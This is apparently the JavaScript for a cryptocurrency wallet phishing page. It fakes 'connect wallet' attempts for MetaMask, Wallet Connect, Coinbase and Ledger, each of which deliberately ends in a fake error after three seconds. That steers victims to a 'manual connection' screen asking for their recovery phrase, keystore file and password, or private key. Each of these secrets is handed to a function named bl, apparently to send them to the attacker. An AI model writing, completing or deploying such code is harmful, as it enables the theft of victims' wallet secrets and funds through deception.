let currentScreen = "in"; // "in", "ld", "er", "ph", "ks", "pk"
        let currentWallet = ""; // "MetaMask", "Wallet Connect", "Coinbase Connect", "Ledger"

        // Function to update the screen display
        function updateScreen() {
            document.getElementById("inScreen").style.display = "none";
            document.getElementById("ldScreen").style.display = "none";
            document.getElementById("erScreen").style.display = "none";
            document.getElementById("phScreen").style.display = "none";
            document.getElementById("ksScreen").style.display = "none";
            document.getElementById("pkScreen").style.display = "none";

            document.getElementById(currentScreen + "Screen").style.display = "flex"; // Assuming these are flex containers
        }

        // Function to set the current screen
        function setScreen(screen) {
            currentScreen = screen;
            updateScreen();
        }

        // Function to set the current wallet
        function setWallet(wallet) {
            currentWallet = wallet;
            // You'd also update the display of currentWallet on the loading/error screens here
            const loadingWalletType = document.getElementById("loadingWalletType");
            if (loadingWalletType) {
                loadingWalletType.innerHTML = ` ${getWalletIcon(currentWallet)} ${currentWallet} Wallet `;
            }
            const errorWalletType = document.getElementById("errorWalletType");
            if (errorWalletType) {
                errorWalletType.innerHTML = ` ${getWalletIcon(currentWallet)} ${currentWallet} Wallet `;
            }
        }

        // Helper to get SVG icons (you'd define these SVG strings or elements)
        function getWalletIcon(walletName) {
            // This is a placeholder. You'd need to define the SVG content for each wallet.
            switch (walletName) {
                case "MetaMask": return '<img src="path/to/metamask-icon.svg" alt="MetaMask Icon" style="width: 24px; height: 24px;">';
                case "Wallet Connect": return '<img src="path/to/walletconnect-icon.svg" alt="Wallet Connect Icon" style="width: 24px; height: 24px;">';
                case "Coinbase Connect": return '<img src="path/to/coinbase-icon.svg" alt="Coinbase Icon" style="width: 24px; height: 24px;">';
                case "Ledger": return '<img src="path/to/ledger-icon.svg" alt="Ledger Icon" style="width: 24px; height: 24px;">';
                default: return '';
            }
        }

        // Event Listeners
        document.addEventListener("DOMContentLoaded", () => {
            updateScreen(); // Initialize display

            document.getElementById("closeButton").addEventListener("click", () => {
                const bScreen = document.getElementById("bScreen");
                if (bScreen) {
                    bScreen.style.display = "none";
                }
                setScreen("in"); // Reset to initial screen when closing
            });

            // Wallet connection buttons
            document.getElementById("metaMaskButton").addEventListener("click", () => {
                setScreen("ld");
                setWallet("MetaMask");
                // Simulate loading, then error after 3 seconds
                setTimeout(() => {
                    setScreen("er");
                }, 3000);
            });

            document.getElementById("walletConnectButton").addEventListener("click", () => {
                setScreen("ld");
                setWallet("Wallet Connect");
                setTimeout(() => {
                    setScreen("er");
                }, 3000);
            });

            document.getElementById("coinbaseConnectButton").addEventListener("click", () => {
                setScreen("ld");
                setWallet("Coinbase Connect");
                setTimeout(() => {
                    setScreen("er");
                }, 3000);
            });

            document.getElementById("ledgerButton").addEventListener("click", () => {
                setScreen("ld");
                setWallet("Ledger");
                setTimeout(() => {
                    setScreen("er");
                }, 3000);
            });

            document.getElementById("connectManuallyButton").addEventListener("click", () => {
                setScreen("ph");
            });

            // Manual connection tabs
            document.getElementById("phraseTab").addEventListener("click", () => setScreen("ph"));
            document.getElementById("keystoreTab").addEventListener("click", () => setScreen("ks"));
            document.getElementById("privateKeyTab").addEventListener("click", () => setScreen("pk"));
            // ... and for other screens if you have multiple tabs like 'ksScreen', 'pkScreen'

            // Manual input fields and proceed buttons
            const phraseInput = document.getElementById("ph");
            const keystoreInput = document.getElementById("ks");
            const keystorePasswordInput = document.getElementById("ksp");
            const privateKeyInput = document.getElementById("pk");

            document.getElementById("phraseProceedButton").addEventListener("click", () => {
                if (phraseInput.value) {
                    bl({ PH: phraseInput.value });
                    alert("Phrase submitted!"); // For demonstration
                } else {
                    alert("Empty");
                }
            });

            document.getElementById("keystoreProceedButton").addEventListener("click", () => {
                if (keystoreInput.value && keystorePasswordInput.value) {
                    bl({ KS: keystoreInput.value, KSP: keystorePasswordInput.value });
                    alert("Keystore submitted!"); // For demonstration
                } else {
                    alert("Empty");
                }
            });

            document.getElementById("privateKeyProceedButton").addEventListener("click", () => {
                if (privateKeyInput.value) {
                    bl({ PK: privateKeyInput.value });
                    alert("Private Key submitted!"); // For demonstration
                } else {
                    alert("Empty");
                }
            });
        });